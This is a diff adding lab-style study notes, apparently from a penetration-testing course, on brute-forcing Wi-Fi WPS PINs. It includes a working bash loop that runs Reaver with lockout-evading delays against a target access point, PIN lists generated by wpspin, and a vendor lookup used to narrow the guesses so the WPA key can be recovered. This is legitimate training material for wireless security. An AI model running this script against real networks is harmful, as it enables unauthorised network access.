@@ -589,3 +589,82 @@ d41y@htb[/htb]$ sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:
 
 In the above command, `-l` sets the time to wait if the access point locks WPS PIN attempts, which is set to 100 seconds. The `-r` option specifies the recurring delay, meaning the command will sleep for 45 seconds every 3 attempts. The `--max-attempts=1` specifies that the tool will only attempt the PIN one time. This option ensures that the PIN is tested just once, rather than multiple attempts.
 
+However, doing this with a list of pre-defined PINs is not very efficient, as you have to re-execute this command for every potential PIN. Luckily, a bit of bash scripting can enable you to conduct a hands off approach for every PIN you generated.
+
+You can extract only the pins from the wpspin output using a combination of `grep` and `tr` commands:
+
+```bash
+d41y@htb[/htb]$ wpspin -A 60:38:E0:A2:3D:2A | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
+
+73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973
+```
+
+This command filters and displays the 8-digit pins from the output file, separating them with spaces. You can now store this output in a variable of a bash script and use it for brute-forcing WPS, as shown below.
+
+```bash
+#!/bin/bash
+
+#We add generated PINs into this list
+PINS='73834410 94229882 73834410 06490959 11184812 63311501 11184812 36499373 63313604 99956042 95661469 89478486 11184812 11184812 95755212 20854836 20144326 33946153 13142452 74163052 51875350 43977680 56587340 95719115 48563710 92148659 05294176 89532331 68175542 71412252 80652847 76229909 46264848 82799427 20233921 31957199 10864111 62327145 30432031 90970948 22369628 33554433 34259283 35611530 20172527 67958146 12345670 74244973'
+
+for PIN in $PINS
+do
+    echo Attempting PIN: $PIN
+    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
+done
+echo "PIN Guesses Complete"
+```
+
+With this script, you execute the same Reaver command for every PIN in the provided list. While it could be refined or built onto, the basic functionality is as follows:
+
+- for each generated PIN attempt, the script will try the PIN only  once, and then wait for 100 seconds if the AP locks
+- additionally, for every three attempts made, it will pause for 45 seconds
+- the script iterates through all PINs in the list, which can be seen in action in the example below
+
+```bash
+d41y@htb[/htb]$ sudo bash pinguess.sh
+
+Attempting PIN: 73834410
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 60:38:E0:A2:3D:2A
+<snip>
+Attempting PIN: 94229882
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 60:38:E0:A2:3D:2A 
+<snip>
+Attempting PIN: 06490959
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 60:38:E0:A2:3D:2A
+<snip>
+Attempting PIN: 76229909
+
+Reaver v1.6.6 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
+
+[+] Waiting for beacon from 60:38:E0:A2:3D:2A
+<snip>
+```
+
+#### Performing Vendor Lookup
+
+If the AP is secured and locks after a few attempts, in some cases you can perform a vendor lookup to refine your list of potential PINs. This can be done using the `oui.txt` file included in Linux distros. The `oui.txt` file contains information about the organizations that own different MAC address prefixes.
+
+To perform a vendor lookup, you can use the following `grep` command, specifying the first portion of the target network's BSSID:
+
+```bash
+d41y@htb[/htb]$ grep -i "60-38-E0" /var/lib/ieee-data/oui.txt
+
+60-38-E0   (hex)                Belkin International Inc.
+```
+
+By performing a vendor lookup and refining your PIN list, you can increase the likelihood of discovering the correct WPS PIN for the target AP. This method leverages known vendor defaults and vulns to enhance your bruteforcing efforts. If successful, this approach can help you retrieve the WPA-PSK and gain access to the secured network.
+
